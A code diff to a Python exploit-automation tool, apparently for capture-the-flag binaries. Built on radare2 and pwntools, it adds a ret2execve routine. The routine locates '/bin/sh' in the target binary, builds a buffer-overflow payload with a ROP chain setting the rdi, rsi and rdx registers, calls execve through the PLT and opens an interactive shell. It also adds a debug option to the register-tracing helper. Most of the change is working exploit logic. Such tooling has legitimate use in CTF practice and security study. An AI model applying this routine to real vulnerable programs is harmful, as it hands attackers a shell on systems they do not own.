@@ -37,9 +37,25 @@ class App:
         self.elf = self.pipe.cmd("aflj")
         
         #one = self.find_one_gadget(binary)
-        self.generate_rop_chain({"rax":0x3b, "rdi":0xcafebabe, "rsi":0, "rdx":0})
+        self.ret2execve(binary)
 
     # ================ SOLVE FUNCTIONS ===================
+
+    def ret2execve(self, binary):
+        io = process(binary)
+
+        vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
+        binsh = next(self.pwnelf.search(b"/bin/sh"))
+        
+        # now that we have /bin/sh address, do the ROP chain
+        payload = self.find_overflow(binary)
+        payload += self.generate_rop_chain({"rdi":binsh, "rsi":0, "rdx":0})
+        payload += p64(self.pwnelf.plt["execve"])
+
+        io.sendlineafter(b">>>", payload)
+
+        io.interactive()
+
 
     # in my test bins, one_gadget does not want to work
     # ret2libc works though
@@ -160,7 +176,7 @@ class App:
    
     # this function will return what the value is for each register at a specific call
     # WARNING: be careful with the amount of params it will be looking for since if done wrong it will search too far
-    def find_params(self, function, call_idx, params=1):
+    def find_params(self, function, call_idx, params=1, debug=False):
         regs = {
                 "rdi": None,
                 "rsi": None,
@@ -192,8 +208,13 @@ class App:
                     if not regs[found[0]] and len(found) == 1:
                         # the value has been populated
                         asm_split = asm.split(",")
+                        
+                        if not debug:
+                            regs[found[0]] = asm_split[-1] 
 
-                        regs[found[0]] = asm_split[-1] 
+                        else:
+                            regs[found[0]] = function["ops"][call_idx]
+
 
                     elif not regs[found[0]]:
                         # the asm looks like `mov reg, reg` and we must find the second reg
@@ -219,8 +240,12 @@ class App:
                                         regs[found[0]] = "Not found"
 
                                     else:
-                                        asm_split = asm.split(",")
-                                        regs[found[0]] = asm_split[-1]
+                                        if not debug:
+                                            asm_split = asm.split(",")
+                                            regs[found[0]] = asm_split[-1]
+
+                                        else:
+                                            regs[found[0]] = function["ops"][tmp]
 
                                     tmp = 0
 
